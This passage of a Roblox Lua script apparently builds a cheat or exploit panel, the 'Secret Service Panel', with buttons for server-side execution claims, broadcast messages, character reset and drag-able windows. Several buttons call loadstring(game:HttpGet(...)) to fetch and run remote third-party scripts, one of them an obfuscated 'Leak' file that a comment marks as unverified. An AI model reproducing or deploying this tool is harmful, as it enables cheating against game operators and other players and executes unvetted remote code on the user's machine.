			elseif status == true then
				status = false
				Executed = "Server"
				Status.Text = "Executed on : Server"
				Status.TextColor3 = Color3.new(0, 1, 0)
				warn("Secret service Panel | Current Executed : Server")
				Notice("Current Executed : Server")
			end
		end)
	
		Open.MouseButton1Click:Connect(function()
			TopBar.Visible = true
			TopBar:TweenSize(UDim2.new(0, 520, 0, 20), "Out", "Sine", 0.9, false)
			Open:TweenPosition(UDim2.new(-0.5, 0, 0.95, 0), "Out", "Sine", 0.9, false)
			wait(1)
			Black:TweenSize(UDim2.new(1, 0, 18, 0), "Out", "Sine", 0.7, false)
			wait(1)
			TopBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			Title.Visible = true
			Main.Visible = true
		end)
	
		Message.MouseButton1Click:Connect(function()
			local mmsg = Instance.new("Message", workspace)
			local TEXT = "["..game.Players.LocalPlayer.Name.."] : "..MSG.Text
	
			for i = 1, #TEXT do
				mmsg.Text = TEXT:sub(1, i)
				wait(0)
			end
			MSG.Text = ""
			wait(3)
			mmsg:Destroy()
		end)
	
		Hint.MouseButton1Click:Connect(function()
			local mmsg = Instance.new("Hint", workspace)
			local TEXT = "["..game.Players.LocalPlayer.Name.."] : "..HINT.Text
	
			for i = 1, #TEXT do
				mmsg.Text = TEXT:sub(1, i)
				wait(0)
			end
			HINT.Text = ""
			wait(6)
			mmsg:Destroy()
		end)
	
		Wis.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/wisl884/wisl-i-Universal-Project1/main/Wisl'i%20Universal%20Project.lua", true))()
		end)
	
		Uni.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Rochips-Universal-21865"))()
		end)
	
		MML.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/mml%20admin'),true))()
		end)
	
	
	
	
		speed.MouseButton1Click:Connect(function()
			SPEED.Text = ""
			SPEED.PlaceholderText = "The Vaule of Instance cannot be converted to Number"
			wait(2)
			SPEED.PlaceholderText = "Enter WalkSpeed"
		end)
	
		Sit.MouseButton1Click:Connect(function()
			game.Players.LocalPlayer.Character.Humanoid.Sit = true
		end)
	
		Setting.MouseButton1Click:Connect(function()
			Admin.Visible = false
			Clear.Visible = false
			Execute.Visible = false
			Script.Visible = false
			Hub.Visible = false
			setting.Visible = true
			List.Visible = true
		end)
	
		local dev = false
	
		Setting1.MouseButton1Click:Connect(function()
			if dev == false then
				dev = true
				Notice("You are now entering Developer Mode")
			elseif dev == true then
				Notice("You Enabled the Developer Mode you dont actived them again")
			end
		end)
	
	
	
		RE.MouseButton1Click:Connect(function()
			game.Players.LocalPlayer.Character.Humanoid.Health = 0
		end)
	
		local function WAKMR_fake_script() -- oldexecutor.Smooth GUI Dragging 
			local script = Instance.new('LocalScript', TopBar)
	
			local UserInputService = game:GetService("UserInputService")
			local runService = (game:GetService("RunService"));
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			function Lerp(a, b, m)
				return a + (b - a) * m
			end;
	
			local lastMousePos
			local lastGoalPos
			local DRAG_SPEED = (4); -- // The speed of the UI darg.
			function Update(dt)
				if not (startPos) then return end;
				if not (dragging) and (lastGoalPos) then
					gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
					return 
				end;
	
				local delta = (lastMousePos - UserInputService:GetMouseLocation())
				local xGoal = (startPos.X.Offset - delta.X);
				local yGoal = (startPos.Y.Offset - delta.Y);
				lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
				gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
			end;
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
					lastMousePos = UserInputService:GetMouseLocation()
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			runService.Heartbeat:Connect(Update)
		end
		coroutine.wrap(WAKMR_fake_script)()
	
		Notice("Welcome "..game.Players.LocalPlayer.Name)
	
		while true do
			wait(5)
			local TEXT = " Secret Service Panel"
	
			for i = 1, #TEXT do
				Title.Text = TEXT:sub(1, i)
				wait(0)
			end
		end
	end)
end;
task.spawn(C_24);
-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton.LocalScript
local function C_26()
local script = G2L["26"];
	script.Parent.MouseButton1Click:Connect(function()
		--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
		loadstring(game:HttpGet("https://raw.githubusercontent.com/swanhtetm/Leak/refs/heads/main/project_segma_v4_obf.lua.txt"))()
	end)
end;
task.spawn(C_26);
-- StarterGui.BS.win7.MAIN.LocalScript
local function C_27()
local script = G2L["27"];
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_27);
-- StarterGui.BS.win7.close.LocalScript
local function C_2e()
local script = G2L["2e"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.TextButton.Visible = true
	end)
end;
task.spawn(C_2e);
-- StarterGui.BS.win7.LocalScript
local function C_2f()
local script = G2L["2f"];
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_2f);
-- StarterGui.BS.win7.LocalScript
local function C_30()
local script = G2L["30"];
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_30);
-- StarterGui.BS.win7.LocalScript
local function C_31()
local script = G2L["31"];
	script.Parent.Position = UDim2.new(0.5, -script.Parent.Size.X.Offset / 2, 0.5, -script.Parent.Size.Y.Offset / 2)
end;
task.spawn(C_31);
-- StarterGui.BS.TextButton.LocalScript
local function C_36()
local script = G2L["36"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.win7.Visible = true
		script.Parent.Visible = false
	end)
end;
task.spawn(C_36);
-- StarterGui.BS.TextButton.LocalScript
local function C_37()
local script = G2L["37"];
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_37);
-- StarterGui.BS.TextButton.LocalScript
local function C_38()
local script = G2L["38"];
	script.Parent.Position = UDim2.new(0.5, -script.Parent.Size.X.Offset / 2, 0.5, -script.Parent.Size.Y.Offset / 2)
end;
task.spawn(C_38);

return G2L["1"], require;
